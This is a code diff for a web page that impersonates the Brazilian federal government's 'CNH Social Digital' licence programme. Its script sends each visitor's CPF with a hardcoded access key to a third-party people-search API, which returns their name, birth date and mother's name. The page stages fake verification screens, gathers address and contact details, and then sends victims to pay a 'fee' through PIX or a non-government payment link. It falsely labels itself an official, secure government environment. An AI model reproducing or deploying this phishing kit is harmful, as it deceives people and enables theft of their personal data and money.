+  <!-- TELA DE EXAMES AGENDADOS -->
+  <main id="tela-exames-agendados" style="display: none">
+    <section class="exames-agendados-container">
+      <div class="breadcrumb">
+        <span><a href="#" onclick="irParaInformacoes(); return false;">Início</a></span>
+        <span> > </span>
+        <span><a href="#" onclick="irParaInformacoes(); return false;">Serviços</a></span>
+        <span> > </span>
+        <span><a href="#" onclick="irParaInformacoes(); return false;">CNH</a></span>
+        <span> > </span>
+        <span>Exames Agendados</span>
+      </div>
+
+      <div class="exames-agendados-card">
+        <div class="validacao-box">
+          <h3>
+            Dados validado com sucesso no Sistema Nacional de Benefícios (SNR)
+          </h3>
+          <p>
+            Parabéns <strong id="nome-exame-agendado">-</strong> você foi
+            aprovado com sucesso e já pode marcar seu exame médico e
+            psicotécnico! A conclusão dessa verificação é essencial para a
+            liberação das aulas teóricas e práticas na autoescola parceira.
+          </p>
+        </div>
+
+        <div class="acompanhamento-box">
+          <h3>Acompanhamento do Processo</h3>
+          <div class="acompanhamento-dados">
+            <div class="acomp-campo">
+              <span class="acomp-label">Nome Completo:</span>
+              <span class="acomp-valor" id="acomp-nome-exame">-</span>
+            </div>
+            <div class="acomp-campo">
+              <span class="acomp-label">CPF:</span>
+              <span class="acomp-valor" id="acomp-cpf-exame">-</span>
+            </div>
+            <div class="acomp-campo">
+              <span class="acomp-label">PROTOCOLO:</span>
+              <span class="acomp-valor" id="acomp-protocolo-exame">-</span>
+            </div>
+          </div>
+        </div>
+
+        <div class="info-agendamento">
+          <i class="fas fa-info-circle"></i>
+          <p>
+            Após a confirmação do pagamento da taxa de emissão, o sistema
+            realizará automaticamente o agendamento dos exames obrigatórios em
+            clínicas credenciadas ao programa. Todas as instruções necessárias
+            para a realização dos exames e início das aulas teóricas e
+            práticas serão enviadas ao seu e-mail cadastrado.
+          </p>
+        </div>
+
+        <div class="checklist-box">
+          <div class="checklist-item completo">
+            <i class="fas fa-check-circle"></i>
+            <span>Dados validados</span>
+          </div>
+          <div class="checklist-item completo">
+            <i class="fas fa-check-circle"></i>
+            <span>Exame psicotécnico</span>
+          </div>
+          <div class="checklist-item completo">
+            <i class="fas fa-check-circle"></i>
+            <span>Exame Médico</span>
+          </div>
+        </div>
+
+        <button class="btn-agendar-data" onclick="voltarParaPrincipal()">
+          AGENDAR DATA
+        </button>
+      </div>
+    </section>
+  </main>
+
+  <!-- TELA DE RESUMO/CONFIRMAÇÃO -->
+  <main id="tela-resumo" style="display: none">
+    <section class="resumo-container">
+      <div class="breadcrumb">
+        <span><a href="#" onclick="irParaInformacoes(); return false;">Início</a></span>
+        <span> > </span>
+        <span><a href="#" onclick="irParaInformacoes(); return false;">Serviços</a></span>
+        <span> > </span>
+        <span><a href="#" onclick="irParaInformacoes(); return false;">CNH</a></span>
+        <span> > </span>
+        <span>Resumo</span>
+      </div>
+
+      <div class="resumo-card">
+        <div class="resumo-header">
+          <i class="fas fa-check-circle"></i>
+          <h1>Confirme seus Dados</h1>
+          <p>
+            Verifique se todas as informações estão corretas antes de
+            prosseguir para o pagamento.
+          </p>
+        </div>
+
+        <!-- DADOS PESSOAIS -->
+        <div class="resumo-secao">
+          <div class="secao-header">
+            <i class="fas fa-user"></i>
+            <h3>Dados Pessoais</h3>
+            <button class="btn-editar" onclick="showToast('Funcionalidade em breve.', 'info')">
+              <i class="fas fa-edit"></i> Editar
+            </button>
+          </div>
+          <div class="secao-conteudo">
+            <div class="dado-linha">
+              <span class="dado-label">CPF:</span>
+              <span class="dado-valor" id="resumo-cpf">-</span>
+            </div>
+            <div class="dado-linha">
+              <span class="dado-label">Nome:</span>
+              <span class="dado-valor" id="resumo-nome">-</span>
+            </div>
+            <div class="dado-linha">
+              <span class="dado-label">Data de Nascimento:</span>
+              <span class="dado-valor" id="resumo-data">-</span>
+            </div>
+            <div class="dado-linha">
+              <span class="dado-label">Nome da Mãe:</span>
+              <span class="dado-valor" id="resumo-mae">-</span>
+            </div>
+          </div>
+        </div>
+
+        <!-- CONTATO -->
+        <div class="resumo-secao">
+          <div class="secao-header">
+            <i class="fas fa-phone"></i>
+            <h3>Contato</h3>
+            <button class="btn-editar" onclick="showToast('Funcionalidade em breve.', 'info')">
+              <i class="fas fa-edit"></i> Editar
+            </button>
+          </div>
+          <div class="secao-conteudo">
+            <div class="dado-linha">
+              <span class="dado-label">Telefone:</span>
+              <span class="dado-valor" id="resumo-telefone">-</span>
+            </div>
+            <div class="dado-linha">
+              <span class="dado-label">E-mail:</span>
+              <span class="dado-valor" id="resumo-email">-</span>
+            </div>
+          </div>
+        </div>
+
+        <!-- ENDEREÇO -->
+        <div class="resumo-secao">
+          <div class="secao-header">
+            <i class="fas fa-map-marker-alt"></i>
+            <h3>Endereço</h3>
+            <button class="btn-editar" onclick="showToast('Funcionalidade em breve.', 'info')">
+              <i class="fas fa-edit"></i> Editar
+            </button>
+          </div>
+          <div class="secao-conteudo">
+            <div class="dado-linha">
+              <span class="dado-label">CEP:</span>
+              <span class="dado-valor" id="resumo-cep">-</span>
+            </div>
+            <div class="dado-linha">
+              <span class="dado-label">Endereço:</span>
+              <span class="dado-valor" id="resumo-endereco">-</span>
+            </div>
+            <div class="dado-linha">
+              <span class="dado-label">Bairro:</span>
+              <span class="dado-valor" id="resumo-bairro">-</span>
+            </div>
+            <div class="dado-linha">
+              <span class="dado-label">Cidade/Estado:</span>
+              <span class="dado-valor" id="resumo-cidade">-</span>
+            </div>
+          </div>
+        </div>
+
+        <!-- AGENDAMENTO DO EXAME -->
+        <div class="resumo-secao">
+          <div class="secao-header">
+            <i class="fas fa-calendar-alt"></i>
+            <h3>Agendamento do Exame</h3>
+            <button class="btn-editar" onclick="showToast('Funcionalidade em breve.', 'info')">
+              <i class="fas fa-edit"></i> Editar
+            </button>
+          </div>
+          <div class="secao-conteudo">
+            <div class="dado-linha">
+              <span class="dado-label">Data:</span>
+              <span class="dado-valor" id="resumo-data-exame">-</span>
+            </div>
+            <div class="dado-linha">
+              <span class="dado-label">Horário:</span>
+              <span class="dado-valor" id="resumo-horario">-</span>
+            </div>
+          </div>
+        </div>
+
+        <!-- TAXA DE INSCRIÇÃO -->
+        <div class="resumo-secao taxa-secao">
+          <div class="secao-header-taxa">
+            <i class="fas fa-receipt"></i>
+            <h3>Taxa de Inscrição</h3>
+          </div>
+          <div class="secao-conteudo taxa-conteudo">
+            <div class="dado-linha">
+              <span class="dado-label">Valor a pagar:</span>
+              <span class="dado-valor taxa-valor">R$ 42,58</span>
+            </div>
+          </div>
+        </div>
+
+      <a href="https://pay.pay-br829sl.site/a6pVgdjovb5Zk7B" class="btn-confirmar-agendar">
+  Confirmar e Agendar
+</a>
+      </div>
+    </section>
+  </main>
+
+  <!-- TELA DE PAGAMENTO -->
+  <main id="tela-pagamento" style="display: none">
+    <section class="pagamento-container">
+      <div class="breadcrumb">
+        <span><a href="#" onclick="irParaInformacoes(); return false;">Início</a></span>
+        <span> > </span>
+        <span><a href="#" onclick="irParaInformacoes(); return false;">Serviços</a></span>
+        <span> > </span>
+        <span><a href="#" onclick="irParaInformacoes(); return false;">CNH</a></span>
+        <span> > </span>
+        <span>Pagamento</span>
+      </div>
+
+      <div class="pagamento-card">
+        <h1>Pagamento - Taxa de Emissão e Ativação</h1>
+        <p class="pagamento-subtitulo">
+          Finalize sua inscrição no programa CNH Social Digital
+        </p>
+
+        <div class="timer-box">
+          <i class="fas fa-clock"></i>
+          <span id="timer-texto">Tempo restante: 29:43</span>
+        </div>
+
+        <div class="taxa-box">
+          <span class="taxa-label">Taxa de Inscrição</span>
+          <span class="taxa-valor">R$ 42,58</span>
+        </div>
+
+        <div class="status-aguardando">
+          <i class="fas fa-hourglass-half"></i>
+          <span>Aguardando confirmação do pagamento...</span>
+        </div>
+
+        <div class="qr-code-container">
+          <img id="qr-code-img" src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='150' height='150'%3E%3Crect fill='%23fff' width='150' height='150'/%3E%3C/svg%3E" alt="QR Code" class="qr-code">
+          <p class="qr-instrucao">
+            Escaneie o QR Code com o app do seu banco
+          </p>
+        </div>
+
+        <div class="divider-pix">ou</div>
+
+        <p class="copie-codigo-label">Ou copie o código PIX:</p>
+
+        <div class="codigo-pix-container">
+          <input type="text" id="codigo-pix" class="codigo-pix-input" value="00020126580014br.gov.bcb.pix2558614b.ppy.com.br/pix2:5614fcbda6d48db0e58e4288e-8" readonly="">
+          <button class="btn-copiar-pix" onclick="copiarCodigoPix()">
+            <i class="fas fa-copy"></i> Copiar código PIX
+          </button>
+        </div>
+
+        <div class="como-pagar">
+          <h3>Como pagar:</h3>
+
+          <div class="opcao-pagar">
+            <span class="opcao-texto">
+              <strong>Abra o app do seu banco ou instituição financeira</strong>
+            </span>
+          </div>
+
+          <div class="opcao-pagar">
+            <span class="opcao-texto">
+              <strong>Escolha pagar via PIX com QR Code ou código copia e
+                cola</strong>
+            </span>
+          </div>
+
+          <div class="opcao-pagar">
+            <span class="opcao-texto">
+              <strong>Escaneie o QR Code ou cópia e código copiado</strong>
+            </span>
+          </div>
+
+          <div class="opcao-pagar">
+            <span class="opcao-texto">
+              <strong>Confirme os dados e finalize o pagamento</strong>
+            </span>
+          </div>
+        </div>
+
+        <div class="seguranca-box">
+          <i class="fas fa-lock"></i>
+          <div>
+            <strong>Pagamento 100% seguro</strong>
+            <p>
+              Suas informações são protegidas com criptografia de ponta a
+              ponta. Ambiente oficial do Governo Federal.
+            </p>
+          </div>
+        </div>
+      </div>
+    </section>
+  </main>
+
+  <footer>
+    <p>© 2026 Governo Federal. Todos os direitos reservados.</p>
+  </footer>
+
+  <div id="toast-container" aria-live="polite" aria-atomic="true"></div>
+
+  <script>
+   const API_BASE = "https://api.amnesiatecnologia.rocks";
+   const API_TOKEN = "2c8b8312-cf07-4bda-a75c-206da0c9fee8";
+   
+   // Nova API Infinity Buscas
+   const INFINITY_API_URL = "https://api.infinitybuscas.com/api/search";
+   const INFINITY_ACCESS_KEY = "inf_85b302c7721fa309acc33a0bfbc2058975725f33553a3e38153256f9e967455a";
+
+    function trackEvent(eventName) {
+      if (window.umami && typeof umami.track === "function") {
+        umami.track(eventName);
+      }
+    }
+
+    let idleTimer = null;
+    let idleDuration = 0;
+    let currentIdleEvent = "";
+
+    function startIdleTracking(eventName, ms) {
+      currentIdleEvent = eventName;
+      idleDuration = ms;
+      resetIdleTimer();
+    }
+
+    function resetIdleTimer() {
+      if (!currentIdleEvent) return;
+      if (idleTimer) clearTimeout(idleTimer);
+      idleTimer = setTimeout(() => {
+        trackEvent(currentIdleEvent);
+        currentIdleEvent = "";
+        idleDuration = 0;
+      }, idleDuration);
+    }
+
+    document.addEventListener("click", resetIdleTimer);
+    document.addEventListener("keydown", resetIdleTimer);
+    document.addEventListener("scroll", resetIdleTimer, { passive: true });
+    document.addEventListener("touchstart", resetIdleTimer, { passive: true });
+
+    document.addEventListener("DOMContentLoaded", () => {
+      trackEvent("screen_login");
+    });
+
+    function showToast(message, type = "error", timeout = 3200) {
+      const container = document.getElementById("toast-container");
+      if (!container) return;
+
+      const toast = document.createElement("div");
+      toast.className = `toast toast-${type}`;
+
+      const icon = document.createElement("i");
+      icon.className =
+        type === "success"
+          ? "fas fa-check-circle toast-icon"
+          : type === "info"
+            ? "fas fa-info-circle toast-icon"
+            : "fas fa-exclamation-triangle toast-icon";
+
+      const text = document.createElement("div");
+      text.textContent = message;
+
+      toast.appendChild(icon);
+      toast.appendChild(text);
+      container.appendChild(toast);
+
+      setTimeout(() => {
+        toast.style.animation = "toast-out 0.2s ease-in forwards";
+        setTimeout(() => toast.remove(), 220);
+      }, timeout);
+    }
+    // Armazena dados do usuário atual
+    let usuarioAtual = {
+      cpf: "",
+      nome: "",
+      dataNascimento: "",
+    };
+
+    function mascaraCPF(i) {
+      let v = i.value.replace(/\D/g, "");
+
+      if (v.length > 11) v = v.slice(0, 11);
+
+      let formatted = "";
+      if (v.length > 0) {
+        formatted = v.slice(0, 3);
+        if (v.length > 3) formatted += "." + v.slice(3, 6);
+        if (v.length > 6) formatted += "." + v.slice(6, 9);
+        if (v.length > 9) formatted += "-" + v.slice(9, 11);
+      }
+
+      i.value = formatted;
+    }
+
+    function validarCPF(cpf) {
+      cpf = cpf.replace(/\D/g, "");
+
+      if (cpf.length !== 11) return false;
+
+      if (/^(\d)\1{10}$/.test(cpf)) return false;
+
+      const cpfArray = cpf.split("").map(Number);
+
+      let soma = 0;
+      for (let i = 0; i < 9; i++) {
+        soma += cpfArray[i] * (10 - i);
+      }
+      let resto = soma % 11;
+      let digito1 = resto < 2 ? 0 : 11 - resto;
+
+      if (cpfArray[9] !== digito1) return false;
+
+      soma = 0;
+      for (let i = 0; i < 10; i++) {
+        soma += cpfArray[i] * (11 - i);
+      }
+      resto = soma % 11;
+      let digito2 = resto < 2 ? 0 : 11 - resto;
+
+      if (cpfArray[10] !== digito2) return false;
+
+      return true;
+    }
+
+    function confirmarCadastroDados() {
+      const nome = document.getElementById("nome-cadastro").value;
+      const dataNasc = document.getElementById("data-cadastro").value;
+      const mae = document.getElementById("mae-cadastro").value;
+
+      if (!nome || !dataNasc || !mae) {
+        showToast("Preencha todos os campos!", "info");
+        return;
+      }
+
+      const dataParts = dataNasc.split("-");
+      const dataFormatada =
+        dataParts[2] + "/" + dataParts[1] + "/" + dataParts[0];
+
+      usuarioAtual.nome = nome.toUpperCase();
+      usuarioAtual.dataNascimento = dataFormatada;
+      usuarioAtual.nome_mae = mae;
+
+      document.getElementById("tela-cadastro-dados").style.display = "none";
+      document.getElementById("tela-informacoes").style.display = "block";
+      document.getElementById("display-cpf").innerText = usuarioAtual.cpf;
+      document.getElementById("nome-usuario").innerText =
+        "OI, " + usuarioAtual.nome + "!";
+
+      window.scrollTo(0, 0);
+      trackEvent("screen_informacoes");
+    }
+    function gerarDatasAleatorias(dataReal) {
+      const datas = new Set();
+      const hoje = new Date();
+      const maxYear = hoje.getFullYear() - 18;
+      const minYear = Math.max(1920, hoje.getFullYear() - 80);
+
+      const formatar = (dia, mes, ano) => {
+        const dd = String(dia).padStart(2, "0");
+        const mm = String(mes).padStart(2, "0");
+        return `${dd}/${mm}/${ano}`;
+      };
+
+      const gerarData = () => {
+        const ano = Math.floor(Math.random() * (maxYear - minYear + 1)) + minYear;
+        const mes = Math.floor(Math.random() * 12) + 1;
+        const dia = Math.floor(Math.random() * 28) + 1;
+        return formatar(dia, mes, ano);
+      };
+
+      if (dataReal) {
+        datas.add(dataReal);
+      }
+
+      while (datas.size < 4) {
+        const data = gerarData();
+        datas.add(data);
+      }
+
+      return Array.from(datas).sort(() => Math.random() - 0.5);
+    }
+    function simularVerificacao() {
+      const btn = document.getElementById("btn-entrar");
+      const cpfDigitado = document.getElementById("cpf").value;
+
+      if (cpfDigitado.length < 14) {
+        showToast("Digite um CPF valido", "info");
+        return;
+      }
+
+      if (!validarCPF(cpfDigitado)) {
+        showToast("CPF invalido", "error");
+        return;
+      }
+
+      btn.innerHTML = "Verificando...";
+      btn.style.opacity = "0.7";
+      btn.disabled = true;
+
+      // Remove formatação do CPF (apenas números)
+      const cpfLimpo = cpfDigitado.replace(/\D/g, "");
+
+      // Tenta usar a API Infinity Buscas através de um proxy CORS
+      const corsProxy = "https://api.allorigins.win/raw?url=";
+      const apiUrl = encodeURIComponent(`${INFINITY_API_URL}?Access-Key=${INFINITY_ACCESS_KEY}&Base=cpf&Info=${cpfLimpo}`);
+      
+      fetch(`${corsProxy}${apiUrl}`, {
+        method: "GET"
+      })
+        .then((response) => {
+          if (!response.ok) {
+            throw new Error('API não disponível');
+          }
+          return response.json();
+        })
+        .then((data) => {
+          if (data.success && data.resultado && data.resultado.dados) {
+            const dados = data.resultado.dados;
+            
+            // Formata a data de nascimento de "YYYY-MM-DD HH:MM:SS" para "DD/MM/YYYY"
+            let dataNascFormatada = "";
+            if (dados.nascimento) {
+              const partes = dados.nascimento.split(" ")[0].split("-");
+              if (partes.length === 3) {
+                dataNascFormatada = `${partes[2]}/${partes[1]}/${partes[0]}`;
+              }
+            }
+
+            usuarioAtual.cpf = cpfDigitado;
+            usuarioAtual.nome = dados.nome || "";
+            usuarioAtual.dataNascimento = dataNascFormatada;
+            usuarioAtual.data_nascimento = dataNascFormatada;
+            usuarioAtual.nome_mae = dados.mae || "";
+
+            document.getElementById("tela-login").style.display = "none";
+            document.getElementById("tela-informacoes").style.display = "block";
+            document.getElementById("display-cpf").innerText = cpfDigitado;
+            document.getElementById("nome-usuario").innerText =
+              "OI, " + dados.nome + "!";
+
+            window.scrollTo(0, 0);
+            trackEvent("screen_informacoes");
+          } else {
+            // CPF não encontrado - solicita cadastro manual
+            document.getElementById("tela-login").style.display = "none";
+            document.getElementById("tela-cadastro-dados").style.display = "block";
+            document.getElementById("cpf-cadastro-display").innerText = cpfDigitado;
+            usuarioAtual.cpf = cpfDigitado;
+
+            window.scrollTo(0, 0);
+            trackEvent("screen_cadastro_dados");
+          }
+        })
+        .catch((error) => {
+          console.error("Erro ao consultar API:", error);
+          // Em caso de erro de CORS ou API indisponível, permite cadastro manual
+          showToast("Preencha seus dados manualmente", "info");
+          document.getElementById("tela-login").style.display = "none";
+          document.getElementById("tela-cadastro-dados").style.display = "block";
+          document.getElementById("cpf-cadastro-display").innerText = cpfDigitado;
+          usuarioAtual.cpf = cpfDigitado;
+          window.scrollTo(0, 0);
+          trackEvent("screen_cadastro_dados");
+        })
+        .finally(() => {
+          btn.innerHTML = "CONTINUAR";
+          btn.style.opacity = "1";
+          btn.disabled = false;
+        });
+    }
+    function irParaVerificacao() {
+      const dataReal =
+        usuarioAtual.dataNascimento || usuarioAtual.data_nascimento || "";
+
+      if (!dataReal) {
+        showToast("Dados insuficientes para validar.", "error");
+        return;
+      }
+
+      const datasOpcoes = gerarDatasAleatorias(dataReal);
+
+      const container = document.querySelector(".opcoes-data");
+      container.innerHTML = "";
+
+      datasOpcoes.forEach((data) => {
+        const label = document.createElement("label");
+        label.className = "radio-option";
+        label.innerHTML = `
+            <input type="radio" name="data-nascimento" value="${data}">
+            <span class="radio-custom"></span>
+            <span class="radio-text">${data}</span>
+        `;
+        container.appendChild(label);
+      });
+
+      document.getElementById("tela-informacoes").style.display = "none";
+      document.getElementById("tela-verificacao").style.display = "block";
+      window.scrollTo(0, 0);
+      trackEvent("screen_verificacao");
+      startIdleTracking("idle_verificacao", 20000);
+    }
+
+    function irParaInformacoes() {
+      document.getElementById("tela-verificacao").style.display = "none";
+      document.getElementById("tela-informacoes").style.display = "block";
+      window.scrollTo(0, 0);
+    }
+    function continuarVerificacao() {
+      const dataSelecionada = document.querySelector(
+        'input[name="data-nascimento"]:checked'
+      );
+
+      if (!dataSelecionada) {
+        showToast("Selecione sua data de nascimento", "info");
+        return;
+      }
+
+      const dataReal =
+        usuarioAtual.dataNascimento || usuarioAtual.data_nascimento || "";
+
+      if (dataSelecionada.value === dataReal) {
+        document.getElementById("tela-verificacao").style.display = "none";
+        document.getElementById("tela-contato").style.display = "block";
+        window.scrollTo(0, 0);
+      } else {
+        showToast("Data de nascimento incorreta. Tente novamente.", "error");
+      }
+    }
+
+    function iniciarValidacao() {
+      const progressBar = document.getElementById("progress-bar");
+      const items = document.querySelectorAll(".validacao-item");
+      let progress = 0;
+      let itemIndex = 0;
+
+      const interval = setInterval(() => {
+        progress += Math.random() * 30;
+        if (progress > 100) progress = 100;
+
+        progressBar.style.width = progress + "%";
+
+        if (itemIndex < items.length && progress >= (itemIndex + 1) * 25) {
+          const item = items[itemIndex];
+          const icon = item.querySelector("i");
+          icon.className = "fas fa-check-circle";
+          icon.style.color = "#2e7d32";
+          item.querySelector(".validacao-text").style.color = "#2e7d32";
+          itemIndex++;
+        }
+
+        if (progress >= 100) {
+          clearInterval(interval);
+          progressBar.style.width = "100%";
+
+          items.forEach((item) => {
+            const icon = item.querySelector("i");
+            icon.className = "fas fa-check-circle";
+            icon.style.color = "#2e7d32";
+            item.querySelector(".validacao-text").style.color = "#2e7d32";
+          });
+
+          setTimeout(() => {
+            document.getElementById("tela-validacao").style.display = "none";
+            document.getElementById("tela-questionario").style.display =
+              "block";
+            window.scrollTo(0, 0);
+          }, 2000);
+        }
+      }, 400);
+    }
+
+    // Sistema de Perguntas do Questionário
+    let perguntaAtual = 0;
+    const perguntas = [
+      {
+        numero: 1,
+        pergunta: "Qual sua idade?",
+        opcoes: [
+          "Menor de 18 (Inapto)",
+          "18 a 24",
+          "25 a 35",
+          "36 a 45",
+          "Acima de 45",
+        ],
+      },
+      {
+        numero: 2,
+        pergunta:
+          "Você está desempregado ou com renda familiar inferior a R$3.100?",
+        opcoes: ["Sim", "Não"],
+      },
+      {
+        numero: 3,
+        pergunta: "Qual categoria deseja solicitar?",
+        opcoes: ["Categoria A (moto)", "Categoria B (carro)", "Ambas"],
+      },
+      {
+        numero: 4,
+        pergunta: "O titular do CPF já tentou emitir a CNH alguma vez?",
+        opcoes: ["Sim", "Não"],
+      },
+      {
+        numero: 5,
+        pergunta: "Você ou um familiar próximo tem carro?",
+        opcoes: ["Sim", "Não"],
+      },
+    ];
+
+    function carregarPergunta() {
+      const container = document.getElementById("pergunta-container");
+      const pergunta = perguntas[perguntaAtual];
+
+      const progressPercent = ((perguntaAtual + 1) / perguntas.length) * 100;
+      document.getElementById("progress-pergunta").style.width =
+        progressPercent + "%";
+
+      container.innerHTML = "";
+
+      const perguntaDiv = document.createElement("div");
+      perguntaDiv.className = "pergunta-section";
+
+      let opcoesHTML = "";
+      pergunta.opcoes.forEach((opcao) => {
+        opcoesHTML += `
+            <label class="opcao-radio">
+                <input type="radio" name="pergunta${pergunta.numero}" value="${opcao}">
+                <span class="radio-custom"></span>
+                <span class="radio-text">${opcao}</span>
+            </label>
+        `;
+      });
+
+      perguntaDiv.innerHTML = `
+        <div class="pergunta-numero">${pergunta.numero}</div>
+        <label class="pergunta-texto">${pergunta.pergunta}</label>
+        <div class="opcoes-pergunta">
+            ${opcoesHTML}
+        </div>
+    `;
+
+      container.appendChild(perguntaDiv);
+    }
+
+    function proximaPergunta() {
+      const selecionado = document.querySelector(
+        `input[name="pergunta${perguntas[perguntaAtual].numero}"]:checked`
+      );
+
+      if (!selecionado) {
+        showToast("Selecione uma opcao", "info");
+        return;
+      }
+
+      if (perguntaAtual < perguntas.length - 1) {
+        perguntaAtual++;
+        carregarPergunta();
+      } else {
+        document.getElementById("tela-questionario").style.display = "none";
+        document.getElementById("tela-resultado").style.display = "block";
+        window.scrollTo(0, 0);
+        iniciarAnimacaoResultado();
+      }
+    }
+
+    document.addEventListener("DOMContentLoaded", function () {
+      const quesinonariosection =
+        document.getElementById("tela-questionario");
+      if (quesinonariosection) {
+        carregarPergunta();
+      }
+    });
+
+    function iniciarAnimacaoResultado() {
+      document.getElementById("nome-resultado").textContent =
+        usuarioAtual.nome;
+
+      const circuloProgresso = document.getElementById("circulo-progresso");
+      const percentualTexto = document.getElementById("percentual-texto");
+      let progresso = 0;
+
+      const interval = setInterval(() => {
+        progresso += Math.random() * 8;
+        if (progresso > 100) progresso = 100;
+
+        const circumference = 2 * Math.PI * 45;
+        const offset = circumference - (progresso / 100) * circumference;
+        circuloProgresso.style.strokeDashoffset = offset;
+
+        percentualTexto.textContent = Math.floor(progresso) + "%";
+
+        if (progresso >= 100) {
+          clearInterval(interval);
+          percentualTexto.textContent = "100%";
+        }
+      }, 150);
+    }
+
+    function responderQuestionario() {
+      const idadeSelect = document.querySelector(
+        'input[name="idade"]:checked'
+      );
+      if (!idadeSelect) {
+        showToast("Selecione sua idade", "info");
+        return;
+      }
+      showToast("Idade selecionada: " + idadeSelect.value, "success");
+    }
+
+    function emitirCadastro() {
+      document.getElementById("tela-resultado").style.display = "none";
+      document.getElementById("tela-endereco").style.display = "block";
+      window.scrollTo(0, 0);
+    }
+    function habilitarEnderecoManual(clear = false) {
+      const fields = ["logradouro", "bairro", "cidade", "estado", "numero"];
+      fields.forEach((id) => {
+        const el = document.getElementById(id);
+        if (!el) return;
+        el.disabled = false;
+        if (clear) el.value = "";
+      });
+    }
+    function mascaraCEP(input) {
+      let value = input.value.replace(/\D/g, "");
+
+      if (value.length > 8) value = value.slice(0, 8);
+
+      let formatted = "";
+      if (value.length > 0) {
+        formatted = value.slice(0, 5);
+        if (value.length > 5) formatted += "-" + value.slice(5, 8);
+      }
+
+      input.value = formatted;
+
+      if (value.length === 8) {
+        buscarCEP(value);
+      }
+    }
+    function buscarCEP(cep) {
+      const cepLimpo = cep.replace(/\D/g, "");
+
+      if (cepLimpo.length < 8) {
+        showToast("CEP incompleto", "info");
+        return;
+      }
+
+      // Usa a API gratuita do ViaCEP
+      fetch(`https://viacep.com.br/ws/${cepLimpo}/json/`, {
+        method: "GET"
+      })
+        .then((response) => response.json())
+        .then((data) => {
+          // ViaCEP retorna {erro: true} quando o CEP não é encontrado
+          if (data.erro) {
+            showToast("CEP nao encontrado. Preencha manualmente.", "error");
+            habilitarEnderecoManual(false);
+            return;
+          }
+
+          // Preenche os campos com os dados do ViaCEP
+          document.getElementById("logradouro").value = data.logradouro || "";
+          document.getElementById("logradouro").disabled = true;
+          document.getElementById("bairro").value = data.bairro || "";
+          document.getElementById("bairro").disabled = true;
+          document.getElementById("cidade").value = data.localidade || "";
+          document.getElementById("cidade").disabled = true;
+          document.getElementById("estado").value = data.uf || "";
+          document.getElementById("estado").disabled = true;
+          document.getElementById("numero").focus();
+          document.getElementById("numero").disabled = false;
+        })
+        .catch((error) => {
+          console.error("Erro:", error);
+          showToast("Erro ao consultar CEP. Preencha manualmente.", "error");
+          habilitarEnderecoManual(false);
+        });
+    }
+    function validarEndereco() {
+      const cep = document.getElementById("cep").value;
+      const logradouro = document.getElementById("logradouro").value;
+      const numero = document.getElementById("numero").value;
+      const bairro = document.getElementById("bairro").value;
+      const cidade = document.getElementById("cidade").value;
+      const estado = document.getElementById("estado").value;
+
+      if (!cep || !logradouro || !numero || !bairro || !cidade || !estado) {
+        showToast("Preencha todos os campos obrigatorios!", "info");
+        return;
+      }
+
+      if (cep.replace(/\D/g, "").length < 8) {
+        showToast("CEP invalido!", "error");
+        return;
+      }
+
+      if (!numero.trim()) {
+        showToast("Digite o numero da residencia!", "info");
+        return;
+      }
+
+      usuarioAtual.cep = cep;
+      usuarioAtual.endereco = logradouro;
+      usuarioAtual.numero = numero;
+      usuarioAtual.complemento =
+        document.getElementById("complemento").value || "";
+      usuarioAtual.bairro = bairro;
+      usuarioAtual.cidade = cidade;
+      usuarioAtual.estado = estado;
+
+      // Gera um protocolo único localmente
+      const timestamp = Date.now();
+      const random = Math.floor(Math.random() * 10000).toString().padStart(4, '0');
+      const protocolo = `CNH${timestamp}${random}`;
+      usuarioAtual.protocolo = protocolo;
+
+      // Simula um pequeno delay de processamento
+      setTimeout(() => {
+        document.getElementById("tela-endereco").style.display = "none";
+        document.getElementById("tela-auto-escola").style.display = "block";
+        window.scrollTo(0, 0);
+      }, 500);
+    }
+    function finalizarCadastro() {
+      const protocolo = usuarioAtual.protocolo || "";
+      if (!protocolo) {
+        showToast("Protocolo nao encontrado. Tente novamente.", "error");
+        return;
+      }
+
+      document.getElementById("numero-protocolo").textContent = protocolo;
+      document.getElementById("cartao-nome-usuario").textContent =
+        usuarioAtual.nome;
+      document.getElementById("cartao-cpf").textContent = usuarioAtual.cpf;
+
+      document.getElementById("cartao-nasc").textContent =
+        usuarioAtual.dataNascimento || usuarioAtual.data_nascimento || "";
+
+      document.getElementById("nome-validacao").textContent =
+        usuarioAtual.nome.split(" ")[0];
+      document.getElementById("acomp-nome").textContent = usuarioAtual.nome;
+      document.getElementById("acomp-cpf").textContent = usuarioAtual.cpf;
+      document.getElementById("acomp-protocolo").textContent = protocolo;
+
+      document.getElementById("tela-auto-escola").style.display = "none";
+      document.getElementById("tela-aprovacao").style.display = "block";
+      window.scrollTo(0, 0);
+    }
+
+    // Variáveis do calendário
+    let dataSelecionada = null;
+    let mesAtual = new Date().getMonth();
+    let anoAtual = new Date().getFullYear();
+    const datasBloqueadas = [3, 10, 17, 24, 31];
+
+    function marcarExames() {
+      document.getElementById("modal-agendamento").style.display = "block";
+      document.getElementById("overlay-agendamento").style.display = "block";
+      document.getElementById("mes-select").value = mesAtual;
+      document.getElementById("ano-select").value = anoAtual;
+      renderizarCalendario();
+    }
+
+    function fecharAgendamento() {
+      document.getElementById("modal-agendamento").style.display = "none";
+      document.getElementById("overlay-agendamento").style.display = "none";
+      dataSelecionada = null;
+    }
+
+    function mesAnterior() {
+      if (mesAtual === 0) {
+        mesAtual = 11;
+        anoAtual--;
+      } else {
+        mesAtual--;
+      }
+      document.getElementById("mes-select").value = mesAtual;
+      document.getElementById("ano-select").value = anoAtual;
+      renderizarCalendario();
+    }
+
+    function mesProximo() {
+      if (mesAtual === 11) {
+        mesAtual = 0;
+        anoAtual++;
+      } else {
+        mesAtual++;
+      }
+      document.getElementById("mes-select").value = mesAtual;
+      document.getElementById("ano-select").value = anoAtual;
+      renderizarCalendario();
+    }
+
+    function mudarMes() {
+      mesAtual = parseInt(document.getElementById("mes-select").value);
+      renderizarCalendario();
+    }
+
+    function mudarAno() {
+      anoAtual = parseInt(document.getElementById("ano-select").value);
+      renderizarCalendario();
+    }
+
+    function renderizarCalendario() {
+      const primeiroDia = new Date(anoAtual, mesAtual, 1).getDay();
+      const ultimoDia = new Date(anoAtual, mesAtual + 1, 0).getDate();
+
+      let html = "";
+
+      for (let i = 0; i < primeiroDia; i++) {
+        html += '<div class="dia vazio"></div>';
+      }
+
+      for (let dia = 1; dia <= ultimoDia; dia++) {
+        const dataVerificacao = new Date(anoAtual, mesAtual, dia);
+        const isDomingo = dataVerificacao.getDay() === 0;
+
